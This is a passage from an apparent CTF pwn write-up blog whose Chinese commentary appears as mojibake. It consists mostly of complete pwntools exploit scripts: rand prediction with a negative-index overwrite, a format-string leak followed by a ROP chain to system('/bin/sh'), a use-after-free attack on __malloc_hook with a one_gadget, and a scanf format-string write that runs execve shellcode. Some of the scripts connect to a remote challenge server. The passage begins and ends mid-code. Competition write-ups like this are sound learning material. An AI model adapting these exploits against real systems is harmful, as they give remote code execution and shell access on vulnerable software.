class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="number">31123</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;input yours id&quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))</span><br><span class="line">rl(<span class="string">&quot;Input yours id authentication code:&quot;</span>)</span><br><span class="line">payload = <span class="built_in">str</span>(elf1.rand())</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;4 wine&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">b&#x27;which one to choose&#x27;</span>)</span><br><span class="line">pay=p64(<span class="number">0x40133B</span>)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;4 wine&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">7</span>))</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">rl(<span class="string">b&#x27;succeed&#x27;</span>)</span><br><span class="line">rl(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1147d0</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,<span class="built_in">bin</span>=get_sb()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;4 wine&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">7</span>))</span><br><span class="line">s(p64(system))</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;4 wine&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">b&#x27;which one to choose&#x27;</span>)</span><br><span class="line">pay=p64(<span class="number">0x401511</span>)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="Offensive-Security">Offensive_Security</h4><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œçº¿ç¨‹é¢˜ï¼Œå¹¶ä¸”ç»™å‡ºlibcåœ°å€ï¼Œåç»­æ ˆæº¢å‡ºç›´æ¥æ‰“systemçš„ropé“¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;Username:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;%7$s&#x27;</span>)</span><br><span class="line">rl(<span class="string">&quot;Welcome, \n&quot;</span>)</span><br><span class="line">password=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21b780</span></span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line"></span><br><span class="line">li(<span class="built_in">hex</span>(password))</span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rl(<span class="string">b&#x27;password: \n&#x27;</span>)</span><br><span class="line">s(p64(password))</span><br><span class="line">li(<span class="built_in">hex</span>(system))</span><br><span class="line">sl(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">rl(<span class="string">&quot;authentication code:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">rl(<span class="string">b&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x0000000000400661</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(rdi+<span class="number">1</span>)+p64(rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">sl(pay)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="vtable-hijack">vtable_hijack</h4><p>2.23ï¼Œuaf+å †æº¢å‡ºï¼Œæ”»å‡»malloc_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p=remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="number">31942</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,con</span>):  </span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;length:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x39bb78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">ogg=libc_base+<span class="number">0xd5c07</span></span><br><span class="line">hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,p64(hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span>+p64(ogg))</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="çº¿ä¸‹">çº¿ä¸‹</h3><p>çº¿ä¸‹ä¸€å…±æ˜¯4é“é¢˜ç›®ï¼Œä¸¤é“ctfä¸¤é“awdp</p><p>ctfä¸¤é“é¢˜è¿˜è¡Œï¼Œä½†å½“æ—¶å¤ªæ‡µäº†æ²¡åšå‡ºæ¥ï¼Œä¸€é“scanfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¦ä¸€é“æ˜¯æ„é€ readæµ‹ä¿¡é“çˆ†ç ´shellcode</p><p>awdpåªåšå‡ºæ¥ä¸€é“ï¼Œæ˜æ˜¾æŠ„è¢­å›½èµ›çš„ä¸€é“é¢˜ç›®ï¼Œæ”»å‡»tcachebinçš„æŒ‡é’ˆåŒºï¼Œå¦ä¸€é“é¢˜ç›®æ²¡ç”¨çœ‹æ‡‚</p><h4 id="scanf">scanf</h4><p>ç»™äº†æ ˆåœ°å€ï¼Œåé—¨æ˜¯ç¦ç”¨syscallçš„shellcodeï¼Œä½†å¯ä»¥ç»•è¿‡</p><p>scanfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å®ç°ä»»æ„åœ°å€å†™</p><p>åç§»çš„è¯ä¸€ä¸ªä¸€ä¸ªæµ‹ï¼Œçœ‹å†™åˆ°å“ªé‡Œï¼Œå†™å¤šå°‘å­—èŠ‚</p><p>å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ç›´æ¥åˆ°åé—¨çš„read</p><p>æ‰§è¡Œshellcode</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1735130967820-81b78faa-ae2c-4cda-a092-f0a341dd37e9.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1735130991741-aef4ceac-dd25-4363-8e37-74ebc2dccc79.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">vuln=<span class="number">0x40127B</span></span><br><span class="line">rl(<span class="string">b&#x27;Welcome this is a gift: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">li(<span class="built_in">hex</span>(stack))</span><br><span class="line">pay=<span class="string">b&#x27;%8$100s\x00&#x27;</span>+p64(stack+<span class="number">0x20</span>)*<span class="number">2</span></span><br><span class="line">bug()</span><br><span class="line">s(pay)</span><br><span class="line">rl(<span class="string">b&#x27;input yours password:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop 